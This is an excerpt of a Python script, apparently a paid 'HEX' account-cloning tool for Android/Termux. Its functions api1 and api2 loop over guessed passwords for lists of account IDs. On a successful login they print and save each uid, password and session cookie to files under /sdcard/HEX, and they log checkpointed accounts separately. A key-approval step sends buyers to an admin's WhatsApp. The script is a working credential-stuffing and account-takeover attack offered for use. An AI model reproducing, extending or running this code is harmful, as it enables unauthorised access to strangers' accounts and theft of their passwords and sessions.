...
logo=(f"""{A}
     {A}ooooo   ooooo oooooooooooo ooooooo  ooooo 
     {G}`888'   `888' `888'     `8  `8888    d8'  
      {A}888     888   888            Y888..8P    
      {G}888ooooo888   888oooo8        `8888'     
      {A}888     888   888    "       .8PY888.    
      {G}888     888   888       o   d8'  `888b   
     {A}o888o   o888o o888ooooood8 o888o  o88888o 
{R}--------------------------------------------------
...
def approval():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} HEX=['+id+']=XD')
      linex()
      print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
      linex()
      input(f'{R}❲{G}1{R}❳{G} Click Enter To Sent Key Admin WhatsApp ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+21369491481?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def file():
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/HE_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
    input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
    os.system('python Main_HEX.py')
##------------FILE_METHOD_(1)-----------##
def sex():
...
def api1(ids,names,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}HEX-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}❲{G}HEX-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'HEX-FILE-M1-OK.txt')
                    open('/sdcard/HEX/HEX-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    ...
                    print(f'\r{R}❲{Y}HEX-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'HEX-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}HEX-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}HEX-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'HEX-FILE-M2-OK.txt')
                    open('/sdcard/HEX/HEX-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}HEX-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'HEX-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
